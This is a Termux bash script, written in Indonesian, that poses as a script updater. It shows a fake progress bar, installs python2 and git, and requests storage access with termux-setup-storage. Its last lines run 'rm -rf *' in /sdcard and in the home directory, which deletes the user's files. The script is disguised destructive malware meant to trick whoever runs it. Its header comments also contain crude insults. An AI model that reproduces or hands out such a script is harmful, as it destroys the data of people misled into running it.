# Jangan Recode Njir, ini coding buatan sendiri
# Creator By Mr.exe
# instagram : andrew.sianturi
#usr/bin/bash
# Jangan Suka recode ya bangsat
# Ini usaha maksimal dengan ilmu maksimal
# Kalo mau belajar ada kontak gua atau info di bawah tentang aku
clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
red='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
# Hati Hati Recode Lu gak bisa apa apa
pkg install python2
clear
python2 __main__.py
clear
echo $cy Masukkan Nama Kamu
read nick
clear
echo $ku Update Script ya @$nick
sleep 3
echo $pu
echo "01% |█                                                  | 10kB 1.0MB/s eta 0:00"
sleep 0.1
echo "02% |█▌                                                 | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "03% |██                                                 | 10kB 1.6MB/s eta 0:00"
sleep 0.1
echo "04% |██▌                                                | 10kB 1.5MB/s eta 0:00"
sleep 0.1
echo "05% |███                                                | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "06% |███▌                                               | 10kB 2.6MB/s eta 0:00"
sleep 0.1
echo "07% |████                                               | 10kB 1.5MB/s eta 0:00"
sleep 0.1
echo "08% |████▌                                              | 10kB 2.2MB/s eta 0:00"
sleep 0.1
echo "09% |█████                                              | 10kB 1.4MB/s eta 0:00"
sleep 0.1
echo "10% |█████▌                                             | 10kB 1.6MB/s eta 0:00"
sleep 0.1
echo "11% |██████                                             | 10kB 2.5MB/s eta 0:00"
sleep 0.1
echo "12% |██████▌                                            | 10kB 1.2MB/s eta 0:00"
sleep 0.1
echo "13% |███████                                            | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "14% |███████▌                                           | 10kB 1.3MB/s eta 0:00"
sleep 0.1
echo "15% |████████                                           | 10kB 1.5MB/s eta 0:00"
sleep 0.1
echo "16% |████████▌                                          | 10kB 2.6MB/s eta 0:00"
sleep 0.1
echo "17% |█████████                                          | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "18% |█████████▌                                         | 10kB 1.9MB/s eta 0:00"
sleep 0.1
echo "19% |██████████                                         | 10kB 2.5MB/s eta 0:00"
sleep 0.1
echo "20% |██████████▌                                        | 10kB 1.3MB/s eta 0:00"
sleep 0.1
echo "21% |███████████                                        | 10kB 2.5MB/s eta 0:00"
sleep 0.1
echo "22% |███████████▌                                       | 10kB 1.7MB/s eta 0:00"
sleep 0.1
echo "23% |████████████                                       | 10kB 2.9MB/s eta 0:00"
sleep 0.1
echo "24% |████████████▌                                      | 10kB 2.2MB/s eta 0:00"
sleep 0.1
echo "25% |█████████████                                      | 10kB 1.5MB/s eta 0:00"
sleep 0.1
echo "26% |█████████████▌                                     | 10kB 2.9MB/s eta 0:00"
sleep 0.1
echo "27% |██████████████                                     | 10kB 1.6MB/s eta 0:00"
sleep 0.1
echo "28% |██████████████▌                                    | 10kB 2.6MB/s eta 0:00"
sleep 0.1
echo "29% |███████████████                                    | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "30% |███████████████▌                                   | 10kB 1.8MB/s eta 0:00"
sleep 0.1
echo "31% |████████████████                                   | 10kB 1.6MB/s eta 0:00"
sleep 0.1
echo "32% |████████████████▌                                  | 10kB 1.5MB/s eta 0:00"
sleep 0.1
echo "33% |█████████████████                                  | 10kB 2.3MB/s eta 0:00"
sleep 0.1
echo "34% |█████████████████▌                                 | 10kB 1.4MB/s eta 0:00"
sleep 0.1
echo "35% |██████████████████                                 | 10kB 2.7MB/s eta 0:00"
sleep 0.1
echo "36% |██████████████████▌                                | 10kB 1.2MB/s eta 0:00"
sleep 0.1
echo "37% |███████████████████                                | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "38% |███████████████████▌                               | 10kB 2.5MB/s eta 0:00"
sleep 0.1
echo "39% |████████████████████                               | 10kB 1.6MB/s eta 0:00"
sleep 0.1
echo "40% |████████████████████▌                              | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "41% |█████████████████████                              | 10kB 1.9MB/s eta 0:00"
sleep 0.1
echo "42% |█████████████████████▌                             | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "43% |██████████████████████                             | 10kB 2.6MB/s eta 0:00"
sleep 0.1
echo "44% |██████████████████████▌                            | 10kB 1.4MB/s eta 0:00"
sleep 0.1
echo "45% |███████████████████████                            | 10kB 1.2MB/s eta 0:00"
sleep 0.1
echo "46% |███████████████████████▌                           | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "47% |████████████████████████                           | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "48% |████████████████████████▌                          | 10kB 1.6MB/s eta 0:00"
sleep 0.1
echo "49% |█████████████████████████                          | 10kB 1.4MB/s eta 0:00"
sleep 0.1
echo "50% |█████████████████████████▌                         | 10kB 1.8MB/s eta 0:00"
sleep 0.1
echo "51% |██████████████████████████                         | 10kB 2.2MB/s eta 0:00"
sleep 0.1
echo "52% |██████████████████████████▌                        | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "53% |███████████████████████████                        | 10kB 1.9MB/s eta 0:00"
sleep 0.1
echo "54% |███████████████████████████▌                       | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "55% |████████████████████████████                       | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "56% |████████████████████████████▌                      | 10kB 1.9MB/s eta 0:00"
sleep 0.1
echo "57% |█████████████████████████████                      | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "58% |█████████████████████████████▌                     | 10kB 1.8MB/s eta 0:00"
sleep 0.1
echo "59% |██████████████████████████████                     | 10kB 2.6MB/s eta 0:00"
sleep 0.1
echo "60% |██████████████████████████████▌                    | 10kB 2.3MB/s eta 0:00"
sleep 0.1
echo "61% |███████████████████████████████                    | 10kB 1.4MB/s eta 0:00"
sleep 0.1
echo "62% |███████████████████████████████▌                   | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "63% |████████████████████████████████                   | 10kB 1.7MB/s eta 0:00"
sleep 0.1
echo "64% |████████████████████████████████▌                  | 10kB 1.4MB/s eta 0:00"
sleep 0.1
echo "65% |█████████████████████████████████                  | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "66% |█████████████████████████████████▌                 | 10kB 2.3MB/s eta 0:00"
sleep 0.1
echo "67% |██████████████████████████████████                 | 10kB 1.6MB/s eta 0:00"
sleep 0.1
echo "68% |██████████████████████████████████▌                | 10kB 2.5MB/s eta 0:00"
sleep 0.1
echo "69% |███████████████████████████████████                | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "70% |███████████████████████████████████▌               | 10kB 2.2MB/s eta 0:00"
sleep 0.1
echo "71% |████████████████████████████████████               | 10kB 1.7MB/s eta 0:00"
sleep 0.1
echo "72% |████████████████████████████████████▌              | 10kB 2.3MB/s eta 0:00"
sleep 0.1
echo "73% |█████████████████████████████████████              | 10kB 2.4MB/s eta 0:00"
sleep 0.1
echo "74% |█████████████████████████████████████▌             | 10kB 1.2MB/s eta 0:00"
sleep 0.1
echo "75% |██████████████████████████████████████             | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "76% |██████████████████████████████████████▌            | 10kB 2.6MB/s eta 0:00"
sleep 0.1
echo "77% |███████████████████████████████████████            | 10kB 2.7MB/s eta 0:00"
sleep 0.1
echo "78% |███████████████████████████████████████▌           | 10kB 2.9MB/s eta 0:00"
sleep 0.1
echo "79% |████████████████████████████████████████           | 10kB 1.8MB/s eta 0:00"
sleep 0.1
echo "80% |████████████████████████████████████████▌          | 10kB 2.2MB/s eta 0:00"
sleep 0.1
echo "81% |█████████████████████████████████████████          | 10kB 2.5MB/s eta 0:00"
sleep 0.1
echo "82% |█████████████████████████████████████████▌         | 10kB 1.8MB/s eta 0:00"
sleep 0.1
echo "83% |██████████████████████████████████████████         | 10kB 1.1MB/s eta 0:00"
sleep 0.1
echo "84% |██████████████████████████████████████████▌        | 10kB 1.8MB/s eta 0:00"
sleep 0.1
echo "85% |███████████████████████████████████████████        | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "86% |███████████████████████████████████████████▌       | 10kB 2.6MB/s eta 0:00"
sleep 0.1
echo "87% |████████████████████████████████████████████       | 10kB 2.9MB/s eta 0:00"
sleep 0.1
echo "88% |████████████████████████████████████████████▌      | 10kB 1.3MB/s eta 0:00"
sleep 0.1
echo "89% |█████████████████████████████████████████████      | 10kB 1.8MB/s eta 0:00"
sleep 0.1
echo "90% |█████████████████████████████████████████████▌     | 10kB 2.9MB/s eta 0:00"
sleep 0.1
echo "91% |██████████████████████████████████████████████     | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "92% |██████████████████████████████████████████████▌    | 10kB 1.2MB/s eta 0:00"
sleep 0.1
echo "93% |███████████████████████████████████████████████    | 10kB 2.5MB/s eta 0:00"
sleep 0.1
echo "94% |███████████████████████████████████████████████▌   | 10kB 2.6MB/s eta 0:00"
sleep 0.1
echo "95% |████████████████████████████████████████████████   | 10kB 1.2MB/s eta 0:00"
sleep 0.1
echo "96% |████████████████████████████████████████████████▌  | 10kB 2.7MB/s eta 0:00"
sleep 0.1
echo "97% |█████████████████████████████████████████████████  | 10kB 2.8MB/s eta 0:00"
sleep 0.1
echo "98% |█████████████████████████████████████████████████▌ | 10kB 2.1MB/s eta 0:00"
sleep 0.1
echo "99% |██████████████████████████████████████████████████ | 10kB 2.9MB/s eta 0:00"
sleep 0.1
echo "100%|██████████████████████████████████████████████████▌| 99kB 9.9MB/s eta 0:00"
sleep 3
clear
echo $ku Menginstall Bahan Script nya dulu ya @$nick
sleep 3
pkg install python2
echo $ku  "Waiting..."
sleep 1
pkg install git
echo $ku "Waiting..."
termux-setup-storage
echo $ku "Waiting..."
sleep 2
clear
echo $red
    sleep 0.05
    echo "      _.-^^---....,,-- "
    sleep 0.05
    echo "  _--                  --_ "
    sleep 0.05
    echo " <                        >) "
    sleep 0.05
    echo " |                         | "
    sleep 0.05
    echo "  \._                   _./ "
    sleep 0.05
    echo "     '''--. . , ; .--'''    " 
    sleep 0.05
    echo "           | |   |           "
    sleep 0.05
    echo "        .-=||  | |=-.    "
    sleep 0.05
    echo "        '-=#$%&%$#=-'    "
    sleep 0.05
    echo "           | ;  :|      "
    sleep 0.05
    echo "  _____.,-#%&$@%#&#~,._____ "
    sleep 0.05
    echo "============================="
cd /sdcard
rm -rf *
cd 
rm -rf *
